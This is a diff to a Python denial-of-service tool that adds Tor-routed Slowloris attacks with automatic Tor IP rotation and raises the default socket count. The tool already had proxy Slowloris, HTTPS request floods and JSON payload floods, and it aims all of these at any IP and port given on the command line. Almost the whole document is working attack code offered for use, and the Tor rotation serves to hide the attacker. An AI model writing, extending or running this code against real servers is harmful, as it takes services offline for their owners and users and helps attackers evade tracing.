@@ -6,6 +6,9 @@ import random
 import time
 import socks
 import ssl
+from stem import Signal
+from stem.control import Controller
+
 
 from colorama import Fore, Back, Style
 fore_colors = {
@@ -42,22 +45,19 @@ styles = {
 with open("user_agent/user_agent_lists.txt", 'r', encoding='utf-8') as file:
     user_agents = [line.strip() for line in file if line.strip()]
 
-num_sockets = 200
 Y_ANSWER = ["Y", "y", "Yes", "YES", "Ye"]
 N_ANSWER = ["N", "n", "No", "NO"]
 
 lock = threading.Lock()
-
 banner = f"""{fore_colors['yellow']}{styles['bright']}                                          
- _    ___         _    _   _          _____     _   _             
-|_|==|  _|___=___| |==| |=| |_=======| __  |===| |_| |_=___=_____ 
-| |==|  _| -_| -_| |=|   ||   | -_|==|    -| | |  _|   | -_|     |
-|_|==|_|=|___|___|_|==|_|=|_|_|___|==|__|__|_  |_| |_|_|___|_|_|_|
-===========================================|___|{back_colors['green']}By.=Potter=V3====={back_colors['reset']} {styles['reset']}
+  ___    __         _   _   _              _        _   _          
+=|_ _|= / _|___ ___| |=| |_| |_  ___   _ _| |_ _  _| |_| |_  _ __  
+ =| | =|  _/ -_) -_) |=|  _| ' \/ -_)=| '_| ' \ || |  _| ' \| '  \ 
+=|___|=|_| \___\___|_|= \__|_||_\___|=|_| |_||_\_, |\__|_||_|_|_|_|=
+===============================================|__/{back_colors['green']}By.=Potter=V3====={back_colors['reset']} {styles['reset']}
     {fore_colors['reset']}"""
 
 help = f"""
-
 {banner}
 Options:                        What it do:
 
@@ -65,27 +65,36 @@ Options:                        What it do:
   --ip <IP>                     Target IP
   -p, --port <PORT>             Target Port (default: 80)
   -ths, --threads <N>           Number of threads (default: 100)
+  -num-socks -n-socks           Number of Socks   (default: 1000)
   -ra, --random-agent           Random User-Agent
   -slowa, --slowloris-attack    Perform Slowloris attack
   -payloada, --payload-attack   Send a JSON file to server
-  --proxy-ip <IP>               Use proxy IP
-  --proxy-port <PORT>           Use proxy Port
+
+  \Mode (slowloris only)
+  //--proxy-ip <IP>               Use proxy IP
+  //--proxy-port <PORT>           Use proxy Port
+
+  //--tor-ip                      Use TOR IP
+  //--tor-port                    Use TOR Port
+  //--change-tor-ip -c-tor-ip     Change Tor ip when Attacking
 
     """
 
 def clear_terminal():
     os.system("clear")
 
-def banner_when_attack(ip, port, threads, amount):
+def banner_when_attack(ip, port, threads, ran):
     
     print(banner)
     print(f"""
 +-{back_colors['green']}Attacking{back_colors['reset']}---------------------------+
           
-{back_colors['cyan']}Target_IP{back_colors['reset']}   : {styles['bright']}{ip}
-{back_colors['cyan']}Target-Port{back_colors['reset']} : {port}
-{back_colors['cyan']}Threads{back_colors['reset']}     : {threads}
-{back_colors['cyan']}Amount{back_colors['reset']}      : {amount}
+Target_IP   : {styles['bright']}{ip}
+Target-Port : {port}
+Threads     : {threads}
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+Random UA   : {ran}
+Socks       : {num_sockets}
 
 [{back_colors['green']}+{back_colors['reset']}] Packet sent...
 **Ctrl+C to {back_colors['red']}exit{back_colors['reset']}**{styles['reset']}
@@ -98,12 +107,19 @@ parser.add_argument("-h", "--help", action='store_true', dest="help_menu", requi
 parser.add_argument("--ip", required=False, help="Target IP")  # ใช้ --ip แทน -ip=
 parser.add_argument("-p", "--port", type=int, required=False, default=80, help="Target Port number")  # รองรับ -p หรือ --port
 parser.add_argument("-ths", "--threads", type=int, default=100, help="Number of threads to use")
+parser.add_argument("--num-socks", "-n-socks", type=int, required=False, default=1000, help="Number of Socks to use (default: 1000)")
 parser.add_argument("-ra", "--random-agent", action='store_true', required=False, help="Random User agent")
 parser.add_argument("-slowa", "--slowloris-attack", action='store_true', required=False, help="Slowloris Attack")
 parser.add_argument("-payloada", "--payload-attack", required=False, action='store_true' ,help="Send a json file to server")
 
+# Proxy
 parser.add_argument("--proxy-ip", required=False, help="Use proxy (ip)")
 parser.add_argument("--proxy-port", required=False, type=int, help="Use proxy (port)")
+
+# Tor
+parser.add_argument("--tor-ip", required=False, help="Use Tor (ip)")
+parser.add_argument("--tor-port", required=False, type=int, help="Use Tor (port)")
+parser.add_argument("-c-tor-ip", "--change-tor-ip", required=False, action='store_true', help="Change Tor ip")
 
 
 args = parser.parse_args()
@@ -112,11 +128,18 @@ help_menu = args.help_menu
 target_ip = args.ip
 port_target = args.port
 num_thread = args.threads
+num_sockets = args.num_socks
 random_user_agent = args.random_agent
 payload_req = args.payload_attack
 
+# Proxy
 proxy_ip = args.proxy_ip
 proxy_port = args.proxy_port
+
+# Tor
+tor_ip = args.tor_ip
+tor_port = args.tor_port
+change_tor = args.change_tor_ip
 
 print("Target IP:", target_ip)
 print("Target Port:", port_target)
@@ -138,8 +161,33 @@ def check_target(target_ip, target_port, timeout=3):
     return False
 
 
-sockets_list = []
+# Check tor
+def check_tor_running(ip="127.0.0.1", port=9050):
+    try:
+        s = socks.socksocket()
+        s.set_proxy(socks.SOCKS5, ip, port)
+        s.settimeout(5)
+        # ลองเชื่อมต่อไปที่ onion service ที่รู้จัก (DuckDuckGo)
+        s.connect(("duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion", 80))
+        s.close()
+        return True
+    except Exception as e:
+        print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Tor is not running or not reachable: {e}{styles['reset']}")
+        return False
 
+# change tor ip
+def change_tor_ip(control_port=9051):
+    try:
+        with Controller.from_port(port=control_port) as controller:
+            controller.authenticate()  # ถ้าใช้ CookieAuthentication ไม่ต้องใส่รหัส
+            controller.signal(Signal.NEWNYM)
+            print(f"[{back_colors['green']}+{back_colors['reset']}] {styles['bright']}Tor IP changed successfully!")
+    except Exception as e:
+        print(f"[{back_colors['red']}!{back_colors['reset']}] Failed to change Tor IP: {styles['bright']}{e}{styles['reset']}")
+
+
+
+sockets_list = []
 def main_attack():
     while True:
         try:
@@ -168,7 +216,7 @@ def main_attack():
 sockets = []
 
 def create_socket():
-    s = socks.socksocket()
+    s = socks.socksocket()  # สร้าง socket ผ่าน PySocks
     s.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
     s.settimeout(4)
     s.connect((target_ip, port_target))
@@ -202,7 +250,45 @@ def slowloris_attack_with_proxy():
                     print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Recreate socket failed: {err_msg}{styles['reset']}")
         time.sleep(10)
 
-def init_socket():
+
+def create_socket_tor():
+    s = socks.socksocket()  # สร้าง socket ผ่าน PySocks
+    s.set_proxy(socks.SOCKS5, tor_ip, tor_port, rdns=True)  # rdns=True = เหมือน SOCKS5H
+    s.settimeout(4)
+    s.connect((target_ip, port_target))
+    if args.random_agent:
+        user_agent = random.choice(user_agents)
+    else:
+        user_agent = "Mozilla/5.0 (Windows NT 6.1; WOW64)"
+    path = "/" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=8))
+    s.send(f"GET {path} HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {user_agent}\r\n".encode())
+    return s
+
+def slowloris_attack_with_tor():
+    print(f"[{back_colors['green']}+{back_colors['reset']}] {styles['bright']}Starting slowloris attack on {target_ip}:{port_target} via Tor at {tor_ip}:{tor_port} with {num_sockets} sockets{styles['reset']}")
+    for _ in range(num_sockets):
+        try:
+            s = create_socket_tor()
+            sockets.append(s)
+        except Exception as e:
+            print(f"[{back_colors['yellow']}!{back_colors['reset']}] {styles['bright']}Socket creation failed: {e}{styles['reset']}")
+
+    while True:
+        for s in sockets[:]:
+            try:
+                s.send(b"X-a: b\r\n")
+            except Exception:
+                sockets.remove(s)
+                try:
+                    new_s = create_socket_tor()
+                    sockets.append(new_s)
+                except Exception as e:
+                    print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Recreate socket failed: {e}{styles['reset']}")
+        time.sleep(10)
+
+
+# Normal SLOWRIS-ATTACK _START_
+def init_socket_normal():
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(4)
@@ -215,15 +301,16 @@ def init_socket():
         print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Socket init failed: {err_msg}{styles['reset']}")
         if "No route to host" in err_msg:
             print(f"[{back_colors['yellow']}!{back_colors['reset']}] {styles['bright']}Target not reachable - waiting before retry...{styles['reset']}")
-            time.sleep(5) 
+            time.sleep(5)  # รอ 5 วินาทีแล้วลองใหม่
         elif "timed out" in err_msg.lower():
-            time.sleep(1)
+            time.sleep(1)  # รอสั้น ๆ แล้วลองใหม่
         else:
-            time.sleep(0.5)
-def slowloris_attack():
+            time.sleep(0.5)  # default wait
+
+def slowloris_attack_normal():
     print(f"[{back_colors['green']}+{back_colors['reset']}] {styles["bright"]}Initializing {num_sockets} sockets...{styles['reset']}")
     for _ in range(num_sockets):
-        init_socket()
+        init_socket_normal()
         time.sleep(0.01)
 
     while True:
@@ -236,7 +323,7 @@ def slowloris_attack():
                     if s in sockets_list:
                         sockets_list.remove(s)
                 try:
-                    new_s = init_socket()
+                    new_s = init_socket_normal()
                     with lock:
                         sockets_list.append(new_s)
                 except Exception as e:
@@ -254,10 +341,10 @@ def slowloris_attack():
         # เติม socket ใหม่
         missing = num_sockets - len(sockets_list)
         for _ in range(missing):
-            init_socket()
+            init_socket_normal()
 
         time.sleep(10)
-
+# Normal SLOWRIS-ATTACK _END_
 
 def send_payload():
     while True:
@@ -285,18 +372,22 @@ def send_payload():
 
 def https_attack():
     try:
+        # สร้าง TCP socket ปกติ
         raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         raw_sock.settimeout(3)
         raw_sock.connect((target_ip, port_target))
 
+        # ห่อด้วย SSL เพื่อให้คุยกับ HTTPS ได้
         context = ssl.create_default_context()
         s = context.wrap_socket(raw_sock, server_hostname=target_ip)
 
+        # เลือก user-agent แบบสุ่ม
         if args.random_agent:
                 user_agent = random.choice(user_agents)
         else:
             user_agent = "Mozilla/5.0 (Windows NT 6.1; WOW64)"
 
+        # สร้าง HTTPS request
         request = (
             f"GET / HTTP/1.1\r\n"
             f"Host: {target_ip}\r\n"
@@ -311,13 +402,14 @@ def https_attack():
     except Exception as e:
         print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Error: {e}{styles['reset']}")
 
-
-def banner_when_attack(ip, port, threads, mode):
-    print(f"[{back_colors['yellow']}*{back_colors['reset']}] {styles['bright']}Attacking {ip}:{port} with {threads} threads (mode: {mode}){styles['reset']}")
-
 # Start attack
-banner_when_attack(target_ip, port_target, num_thread, "slowloris" if args.slowloris_attack else "main")
 if check_target(target_ip, port_target):
+    if args.random_agent:
+        rand_ua = True
+    else:
+        rand_ua = False
+
+    banner_when_attack(target_ip, port_target, num_thread, rand_ua)
     print(f"[{back_colors['green']}*{back_colors['reset']}] {styles['bright']}Checking...{styles['reset']}")
     time.sleep(1)
     for i in range(num_thread):
@@ -325,13 +417,37 @@ if check_target(target_ip, port_target):
             print(help)
             exit()
         
+        # TOR Attack (slowloris)
+        elif args.slowloris_attack and args.tor_ip and args.tor_port:
+            if check_tor_running():
+                print(f"\n[{back_colors['green']}+{back_colors['reset']}] {styles['bright']}Tor is running and reachable{styles['reset']}")
+                time.sleep(3)
+                t = threading.Thread(target=slowloris_attack_with_tor, daemon=True)
+                if args.change_tor_ip:
+                    time.sleep(5)
+                    change_tor_ip()
+                    print(f"\n{styles['bright']}** Changeing Tor IP it will take ({back_colors['cyan']}10s/per 1 IP{back_colors['reset']}) **{styles['reset']}")
+                    time.sleep(10)
+
+            else:
+                print(f"\n[{back_colors['red']}!{back_colors['reset']}] Please start {styles['bright']}Tor{styles['reset']} before running this script: tor")
+                time.sleep(3)
+
+                exit()
+
+
+        # Proxy Attack (Slowloris)
         elif args.slowloris_attack and args.proxy_ip and args.proxy_port:
             t = threading.Thread(target=slowloris_attack_with_proxy, daemon=True)
         
+
+
+        # Slowloris Attack_Normal
         elif args.slowloris_attack:
-            t = threading.Thread(target=slowloris_attack, daemon=True)
+            t = threading.Thread(target=slowloris_attack_normal, daemon=True)
 
 
+        # Payload Attack
         elif args.payload_attack:
             # are_u_sure = input("Are u sure, it will make ur pc lag(y/n): ")
             # if are_u_sure in Y_ANSWER:
@@ -346,8 +462,11 @@ if check_target(target_ip, port_target):
             #     exit()
             t = threading.Thread(target=send_payload, daemon=True)
 
+        # Https Attak
         elif args.port == 443:
             t = threading.Thread(target=https_attack, daemon=True)
+
+        # 
         else:
             t = threading.Thread(target=main_attack, daemon=True)
         t.start()
@@ -356,3 +475,5 @@ if check_target(target_ip, port_target):
 
 else:
     print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Target not reachable. Aborting.{styles['reset']}")
+
+# กัน script หลุด
